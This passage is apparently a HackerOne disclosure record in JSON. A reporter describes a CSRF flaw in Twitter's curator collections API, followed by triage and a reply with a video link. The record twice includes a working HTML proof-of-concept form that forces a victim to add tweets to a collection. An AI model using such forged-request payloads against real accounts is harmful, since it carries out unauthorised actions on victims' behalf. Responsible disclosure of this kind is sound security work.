6Z","team_member_agreed_on_going_public_at":"2016-08-22T18:54:18.468Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\nI have found a CSRF vulnerability which force victim to add tweets in his collection.\n\nHTML POC : \n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform action=\"https://curator.twitter.com/api/collections/STREAM/content\" method=\"POST\"\u003e\n\u003cinput type=\"hidden\" name=\"tweet_ids[]\" value=\"667977435124658176\"\u003e\n\u003cinput type=\"hidden\" name=\"collections[]\" value=\"667916850294951936\"\u003e\n\u003cinput type=\"hidden\" name=\"model[id]\" value=\"STREAM\"\u003e\n\u003cinput type=submit\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\nBefore using this POC change the Collection ID to your collection ID and you will see that tweet will be added into your collection.You can Also add so many tweets in one request by adding \"tweet_ids\" parameter multiple times.\n\nLet me know if you need any other help from my side.\n\nBest Regards !\nVijay Kumar ","bounty_amount":"560.0","formatted_bounty":"$560","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-21T17:42:37.283Z","allow_singular_disclosure_after":-159478420.7139427,"singular_disclosure_allowed":true,"vote_count":9,"voters":["akhilmm","ymy","nigba","shivathegame","badges","dyabla","nathanfulkerson","mithunarunan","ducdna"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":697648,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello, thank you for your report. \n\nWe're having trouble reproducing the issue that you've reported. Please provide us with detailed instructions on how to reproduce this exploit. Any additional images, or a video, would also help us to evaluate this report. \n\nThank you for thinking of Twitter security. ","automated_response":false,"created_at":"2015-11-24T16:30:21.932Z","updated_at":"2015-11-24T16:30:21.932Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":699711,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@bugtriage : Hope you are good @ I have created a Video POC to for more understanding this issue.\nLink : https://youtu.be/qzHX9AGayKA\n\nThis CSRF impacts main twitter's collection feature of any user. By this i am able to add any tweet to any user's collection through CSRF attack.\nThe end point of this issue is curator.twitter.com where adding a tweet to collection is not properly protected with CSRF.\n\nTo reproduce this you need to run below mentioned HTML code :\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform action=\"https://curator.twitter.com/api/collections/STREAM/content\" method=\"POST\"\u003e\n\u003cinput type=\"hidden\" name=\"tweet_ids[]\" value=\"667977435124658176\"\u003e\n\u003cinput type=\"hidden\" name=\"collections[]\" value=\"[Collection_ID]\"\u003e\n\u003cinput type=\"hidden\" name=\"model[id]\" value=\"STREAM\"\u003e\n\u003cinput type=submit\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\nJust add your collection in the collection field and run this code.The tweet number 667977435124658176 will be added in you collection now.\n\nLet me know if you need any other help from my side.\n\nBest Regards !\nVijay Kumar ","automated_response":false,"created_at":"2015-11-26T03:07:08.462Z","updated_at":"2015-11-26T03:07:08.462Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hack